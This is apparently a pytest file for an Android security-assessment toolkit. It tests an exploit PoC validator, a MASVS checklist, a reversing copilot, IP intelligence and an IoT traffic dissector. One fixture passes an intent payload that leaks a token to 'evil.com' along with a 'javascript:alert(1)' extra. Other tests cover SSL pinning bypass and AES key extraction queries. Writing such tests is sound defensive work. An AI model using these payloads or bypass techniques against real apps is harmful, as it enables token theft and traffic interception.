"""Tests for Phase 13C: Exploit PoC Validator, MASVS Checklist, IP Intel & IoT Sniffer."""

from __future__ import annotations

import json
from pathlib import Path

import pytest
from typer.testing import CliRunner

from raa.cli.main import app
from raa.runtime import Runtime
from raa.services.android.iot_sniffer import dissect_iot_traffic
from raa.services.api.ip_intel import analyze_ip_intelligence
from raa.services.security.masvs_copilot import (
    audit_masvs_compliance,
    suggest_next_reversing_steps,
)
from raa.services.security.poc_validator import validate_exploit_poc

runner = CliRunner()


def _invoke_cli(tmp_path: Path, *args: str):
    return runner.invoke(
        app,
        ["--workspace", str(tmp_path / "workspace"), *args],
    )


# =====================================================================
# Unit Tests: Autonomous Exploit PoC Validator
# =====================================================================


def test_poc_validation_confirmed_vulnerable() -> None:
    manifest_xml = """<?xml version="1.0" encoding="utf-8"?>
    <manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.app">
        <application>
            <activity android:name=".AuthRedirectActivity" android:exported="true">
                <intent-filter>
                    <action android:name="android.intent.action.VIEW"/>
                </intent-filter>
            </activity>
        </application>
    </manifest>
    """
    res = validate_exploit_poc(
        vuln_type="intent_redirection",
        target_package="com.app",
        target_component=".AuthRedirectActivity",
        intent_action="android.intent.action.VIEW",
        intent_data="https://evil.com/leak?token=123",
        intent_extra={"forward_url": "javascript:alert(1)"},
        manifest_xml=manifest_xml,
    )
    assert res["verdict"] == "CONFIRMED_VULNERABLE"
    assert res["exploitability_score"] >= 90.0
    assert res["is_exploitable"] is True
    assert res["dangerous_payload_detected"] is True
    assert "adb shell am start" in res["verified_adb_command"]
    assert len(res["reproduction_steps"]) >= 4


def test_poc_validation_guarded_component() -> None:
    manifest_xml = """<?xml version="1.0" encoding="utf-8"?>
    <manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.app">
        <application>
            <activity android:name=".InternalAdmin"
                android:exported="false"
                android:permission="com.app.permission.INTERNAL"/>
        </application>
    </manifest>
    """
    res = validate_exploit_poc(
        vuln_type="intent_redirection",
        target_package="com.app",
        target_component=".InternalAdmin",
        manifest_xml=manifest_xml,
    )
    assert res["verdict"] == "NOT_VULNERABLE_GUARDED"
    assert res["exploitability_score"] <= 20.0
    assert res["is_exploitable"] is False


# =====================================================================
# Unit Tests: OWASP MASVS v2.0 Checklist & Reversing Copilot
# =====================================================================


def test_masvs_compliance_audit() -> None:
    findings = [
        {"masvs_id": "MASVS-STORAGE", "title": "Plaintext token in SharedPreferences"},
        {"masvs_id": "MASVS-CRYPTO", "title": "AES/ECB weak cipher mode used"},
        {"masvs_id": "MASVS-NETWORK", "title": "TrustManager ignores SSL errors"},
    ]
    manifest = """<manifest xmlns:android="http://schemas.android.com/apk/res/android">
        <application android:debuggable="true" android:usesCleartextTraffic="true"/>
    </manifest>"""

    audit = audit_masvs_compliance(
        findings=findings,
        manifest_xml=manifest,
        is_debuggable=True,
        uses_cleartext=True,
        is_minified=False,
    )
    assert audit["overall_compliance_pct"] < 80.0
    assert audit["is_masvs_compliant"] is False
    assert len(audit["checklist"]) == 7
    assert len(audit["remediation_roadmap"]) >= 3


def test_reversing_copilot_recommendations() -> None:
    # 1. SSL pinning bypass query on Flutter app
    copilot_flutter = suggest_next_reversing_steps(
        user_goal="How to bypass SSL certificate pinning in this APK?",
        detected_frameworks=["Flutter"],
    )
    assert copilot_flutter["goal_classification"] == "NETWORK_SECURITY_BYPASS"
    assert "flutter_unpin" in copilot_flutter["suggested_tools"]
    assert "libflutter" in (copilot_flutter["recommended_frida_script"] or "")

    # 2. Crypto key extraction query
    copilot_crypto = suggest_next_reversing_steps(
        user_goal="Find AES secret keys and decrypt local database payload",
    )
    assert copilot_crypto["goal_classification"] == "CRYPTOGRAPHIC_KEY_EXTRACTION"
    assert "Cipher" in (copilot_crypto["recommended_frida_script"] or "")


# =====================================================================
# Unit Tests: Backend IP Intelligence Engine
# =====================================================================


def test_ip_intelligence_asn_and_risk() -> None:
    ips = ["1.1.1.1", "52.14.88.99", "192.168.1.1", "240.0.0.1", "invalid_ip"]
    intel = analyze_ip_intelligence(ips)
    assert intel["total_analyzed"] == 5
    assert intel["datacenter_ips_count"] >= 2

    records = {r["ip"]: r for r in intel["intel_records"]}
    assert records["1.1.1.1"]["asn"] == 13335
    assert "Cloudflare" in records["1.1.1.1"]["asn_org"]

    assert records["52.14.88.99"]["asn"] == 16509
    assert "Amazon" in records["52.14.88.99"]["asn_org"]

    assert records["192.168.1.1"]["is_private"] is True
    assert records["240.0.0.1"]["is_bogon"] is True
    assert records["240.0.0.1"]["threat_score"] >= 80.0
    assert records["invalid_ip"]["is_valid"] is False


# =====================================================================
# Unit Tests: Local IoT Protocol Dissector
# =====================================================================


def test_iot_protocol_dissector() -> None:
    raw_traffic = """
    _googlecast._tcp.local. PTR Google-Nest-Hub._googlecast._tcp.local. 192.168.1.105:8008
    NOTIFY * HTTP/1.1
    HOST: 239.255.255.250:1900
    LOCATION: http://192.168.1.110:49152/wps_device.xml
    SERVER: Linux/3.10 UPnP/1.0
    ST: urn:schemas-upnp-org:device:MediaServer:1
    http://schemas.xmlsoap.org/ws/2005/04/discovery probe from 192.168.1.125
    {"cmd":"scan_device","device":"smart_bulb_rgb","token":"secret123"}
    """
    res = dissect_iot_traffic(raw_traffic)
    assert "mDNS" in res["protocols_detected"]
    assert "SSDP/UPnP" in res["protocols_detected"]
    assert "WS-Discovery" in res["protocols_detected"]
    assert "UDP_JSON_Beacon" in res["protocols_detected"]
    assert res["devices_discovered_count"] >= 3
    assert len(res["exposed_endpoints"]) >= 2
    assert len(res["security_alerts"]) >= 2


# =====================================================================
# Integration Tests: Runtime Invocation & Tool Registration
# =====================================================================


@pytest.mark.asyncio
async def test_phase13c_runtime_tool_invocations(runtime: Runtime) -> None:
    caps = await runtime.invoke("capabilities_get", {})
    assert caps.data["implemented_tools"] >= 182
    assert caps.data["planned_tools"] >= 182
    assert caps.data["profiles"]["minimal"] == 12
    assert caps.data["profiles"]["core"] >= 110
    assert caps.data["profiles"]["dynamic"] >= 130
    assert caps.data["profiles"]["api"] >= 130
    assert caps.data["profiles"]["ui"] >= 132
    assert caps.data["profiles"]["full"] >= 182

    proj = runtime.projects.create(name="Phase 13C Project", description="Testing Phase 13C")
    pid = proj.id

    # 1. sec_poc_validate
    val_res = await runtime.invoke(
        "sec_poc_validate",
        {
            "project_id": pid,
            "target_package": "com.test.app",
            "target_component": ".DeepLinkActivity",
            "intent_data": "https://test.com/payload?cmd=exec",
        },
    )
    assert val_res.data["is_exploitable"] is True

    # 2. sec_masvs_audit
    masvs_res = await runtime.invoke(
        "sec_masvs_audit",
        {
            "project_id": pid,
            "is_debuggable": True,
            "uses_cleartext": True,
        },
    )
    assert "overall_compliance_pct" in masvs_res.data
    assert len(masvs_res.data["checklist"]) == 7

    # 3. copilot_suggest_next
    copilot_res = await runtime.invoke(
        "copilot_suggest_next",
        {
            "project_id": pid,
            "user_goal": "bypass certificate pinning in app",
        },
    )
    assert copilot_res.data["goal_classification"] == "NETWORK_SECURITY_BYPASS"

    # 4. net_ip_intel
    ip_res = await runtime.invoke(
        "net_ip_intel",
        {
            "project_id": pid,
            "ip_addresses": "104.16.1.1, 8.8.8.8",
        },
        profile="api",
    )
    assert ip_res.data["total_analyzed"] == 2
    assert ip_res.data["datacenter_ips_count"] >= 1

    # 5. net_iot_sniffer
    iot_res = await runtime.invoke(
        "net_iot_sniffer",
        {
            "project_id": pid,
            "traffic_input": "_hue._tcp.local 192.168.1.150:80",
        },
        profile="dynamic",
    )
    assert iot_res.data["devices_discovered_count"] >= 1


# =====================================================================
# CLI Tests: Phase 13C Commands
# =====================================================================


def test_cli_phase13c_commands(tmp_path: Path) -> None:
    # 1. sec poc-validate
    poc_res = _invoke_cli(
        tmp_path,
        "--json",
        "security",
        "poc-validate",
        "com.victim.app",
        "--component",
        ".InsecureReceiver",
        "--type",
        "broadcast_receiver",
    )
    assert poc_res.exit_code == 0
    poc_data = json.loads(poc_res.stdout)
    assert poc_data["data"]["target_package"] == "com.victim.app"

    # 2. sec masvs-audit
    masvs_res = _invoke_cli(
        tmp_path,
        "--json",
        "security",
        "masvs-audit",
        "--debuggable",
        "--cleartext",
    )
    assert masvs_res.exit_code == 0
    masvs_data = json.loads(masvs_res.stdout)
    assert "overall_compliance_pct" in masvs_data["data"]
    assert len(masvs_data["data"]["checklist"]) == 7

    # 3. sec copilot-suggest
    copilot_res = _invoke_cli(
        tmp_path,
        "--json",
        "security",
        "copilot-suggest",
        "extract sqlite database",
    )
    assert copilot_res.exit_code == 0
    copilot_data = json.loads(copilot_res.stdout)
    assert copilot_data["data"]["goal_classification"] == "LOCAL_STORAGE_AUDIT"

    # 4. api ip-intel
    ip_res = _invoke_cli(
        tmp_path,
        "--json",
        "api",
        "ip-intel",
        "1.1.1.1 52.0.0.1",
    )
    assert ip_res.exit_code == 0
    ip_data = json.loads(ip_res.stdout)
    assert ip_data["data"]["total_analyzed"] == 2

    # 5. dynamic iot-sniffer
    iot_res = _invoke_cli(
        tmp_path,
        "--json",
        "dynamic",
        "iot-sniffer",
        "_airplay._tcp.local 192.168.1.200:7000",
    )
    assert iot_res.exit_code == 0
    iot_data = json.loads(iot_res.stdout)
    assert "mDNS" in iot_data["data"]["protocols_detected"]
